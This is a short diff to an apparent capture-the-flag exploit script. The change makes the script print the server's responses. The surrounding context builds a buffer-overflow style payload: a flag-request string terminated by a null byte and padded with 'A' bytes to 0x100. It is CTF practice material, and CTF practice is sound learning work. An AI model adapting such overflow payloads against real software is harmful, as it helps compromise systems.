@@ -16,7 +16,8 @@ def conn():
 def main():
     r = conn()
 
-    r.recv()
+    print(r.recv())
+    print(r.recv())
 
     condition = b"Je voudrais le flag\x00"
     junk = b"A" * (0x100 - len(condition))
